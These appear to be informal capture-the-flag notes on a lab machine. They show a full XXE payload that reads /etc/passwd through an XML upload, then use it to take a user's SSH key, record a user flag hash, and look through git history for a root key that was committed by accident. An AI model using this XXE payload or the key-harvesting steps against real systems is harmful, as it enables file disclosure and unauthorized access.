notes:
uploading an example code exection cml file reveals a user called roosa.
we can read /etc/passwd so lets try read the ssh ke
load this in burpe by just uploading test.txt
<test>
  <Author>fieldraccoon</Author>
  <Subject>fieldraccoon</Subject>
  <Content>fieldraccoon</Content>
</test>

<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>

<test>
  <Author>fieldraccoon</Author>
  <Subject>&file;</Subject>
  <Content>fieldraccoon</Content>
</test>

then cahnge the file to the ssh key for roosa and we get the key
user: c5808e1643e801d40f09ed87cdecc67b

there is a git directory in /home/roosa/work/blogfeed/.git
running git log we find

    reverted accidental commit with proper key
this means that if we access that key it might be the root key that we can ssh with
git log --name-only --oneline                                                                                                                                                                                                              
                                                                                                                                                                                                                                           
we can also just cat this file to find the key
